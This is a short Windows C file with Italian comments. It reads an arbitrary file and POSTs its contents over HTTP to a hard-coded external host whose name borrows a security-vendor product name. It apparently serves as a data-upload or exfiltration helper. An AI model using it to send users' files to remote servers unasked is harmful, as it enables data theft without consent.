#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#define URL "fortigate3600.pythonanywhere.com"

int sendText(char* BufferText) {
    HINTERNET hInternet = NULL, hConnect = NULL, hRequest = NULL;
    BOOL bResults = FALSE;
    int ret = 0;

    //TODO cambiare in text
    char *postData = (char *)malloc(strlen(BufferText) + 20);
    strcpy(postData, "testo=");
    strcat(postData, BufferText);
    
    const char* headers = "Content-Type: application/x-www-form-urlencoded";
    // TODO cambiare in Myclient
    hInternet = InternetOpenA("IlMioClientC/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet) {
        hConnect = InternetConnectA(hInternet, URL, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (hConnect) {
            // TODO camvbaire in /sens
            hRequest = HttpOpenRequestA(hConnect, "POST", "/invia", NULL, NULL, NULL, 0, 0);
            
            if (hRequest) {
                bResults = HttpSendRequestA(hRequest, headers, strlen(headers), (LPVOID)postData, strlen(postData));
                if (!bResults) {
                    ret = -4; // Errore nella send request
                }
            } else {
                ret = -3; // Errore HttpOpenRequestA
            }
        } else {
            ret = -2; // Errore: Impossibile connettersi all'URL
        }
    } else {
        ret = -1; // Errore interno di Windows (WinINet)
    }
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    free(postData);
    return ret;
}

// TODO da testare
int sendTextFromFile(char* filename){
    FILE *file = fopen(filename, "rb");
    
    if (file == NULL) {
        return -1; 
    }

    fseek(file, 0, SEEK_END);
    long size = ftell(file);
    rewind(file);
    
    int ret = -1;
    if (size > 0) {
        char *buffer = (char *)malloc(size + 1);
        if (buffer != NULL) {
            size_t bytesRead = fread(buffer, 1, size, file);
            buffer[bytesRead] = '\0'; 
            ret = sendText(buffer);
            free(buffer);
        }
    }
    fclose(file);
    return ret;
}

